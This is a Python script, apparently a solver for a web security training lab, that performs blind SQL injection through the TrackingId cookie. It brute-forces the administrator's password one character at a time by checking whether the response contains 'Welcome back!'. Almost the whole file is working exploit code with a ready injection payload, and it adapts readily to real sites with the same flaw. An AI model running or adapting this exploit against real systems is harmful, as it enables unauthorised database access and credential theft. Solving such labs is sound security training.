# Laboratory 02: Blind SQLi
# Author: Emiliano Rivas (RVXS)

from urllib import request
import requests, sys, string, urllib, urllib3

# If you want to use Burp Suite proxy, uncomment the 2 lines below
# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# burp_proxies = {
#     'http' : 'http://127.0.0.1:8080',
#     'https': 'https://127.0.0.1:8080'
# }

def exploit(url):
    password   = ""
    characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
    session    = requests.Session()
    session_cookies = session.get(url).cookies.get_dict()

    print("\nGetting password ...\n")

    for position in range(1, 21):
        for char in characters:
            payload =  "' AND (SELECT SUBSTRING(password, %s, 1) FROM users WHERE username='administrator')='%s'--" % (position, char)
            payload_encoded = urllib.parse.quote(payload)
            cookies = {
                'TrackingId':  session_cookies['TrackingId'] + payload_encoded,
                'session': session_cookies['session']
            }

            # Using proxies
            # response = requests.get(url, cookies = cookies, verify = False, proxies = burp_proxies)

            # Without proxies               
            response = requests.get(url, cookies = cookies)
            

            if "Welcome back!" not in response.text:
                sys.stdout.write('\rPassword: ' + password + char)
                sys.stdout.flush()
            else:
                password += char
                sys.stdout.write('\rPassword: ' + password)
                sys.stdout.flush()
                break;



def main():
    print("\n-------------------")
    print("WSA Lab-11 Solver")
    print("-------------------\n")

    url = input("Enter the URL: ").strip()

    exploit(url)

if __name__ == "__main__":
    main()